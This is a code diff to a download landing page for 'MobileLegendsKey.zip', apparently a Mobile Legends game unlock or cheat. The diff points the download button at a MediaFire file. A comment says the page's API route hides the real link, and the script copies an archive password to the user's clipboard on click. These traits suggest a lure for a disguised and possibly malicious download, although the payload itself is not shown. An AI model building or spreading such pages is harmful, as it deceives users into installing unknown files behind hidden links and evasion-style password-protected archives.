@@ -106,7 +106,7 @@ ul.chk li.ok i{background:var(--teal);border-color:var(--teal);color:#032b26;ani
   <div>
     <h1>Unlock the <span>Legend</span> on your phone.</h1>
     <p class="lead">Tap download and the file starts right away. The file size and checksum are listed below, so you know exactly what you’re getting.</p>
-    <a class="btn" id="dlBtn" href="MobileLegendsKey.zip" >
+    <a class="btn" id="dlBtn" href="https://www.mediafire.com/file/fn9dpkr0l18w6hg/MobileLegendsKey.zip/file" >
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v13m0 0l-5-5m5 5l5-5M4 21h16"/></svg>
       Download MobileLegendsKey.zip
     </a>
@@ -212,7 +212,7 @@ show('a');
 document.querySelectorAll('.tab').forEach(function(b){b.onclick=function(){document.querySelectorAll('.tab').forEach(function(x){x.setAttribute('aria-selected',x===b)});show(b.dataset.t)}});
 
 // direct download: set DOWNLOAD_URL to the direct link of your ZIP (served by api/download.js, which hides the real link)
-var DOWNLOAD_URL='/api/download';
+var DOWNLOAD_URL='https://www.mediafire.com/file/fn9dpkr0l18w6hg/MobileLegendsKey.zip/file';
 $('dlBtn').href=DOWNLOAD_URL;
 function pw(){return(navigator.clipboard?navigator.clipboard.writeText('key72026mm'):Promise.reject())}
 $('dlBtn').addEventListener('click',function(){
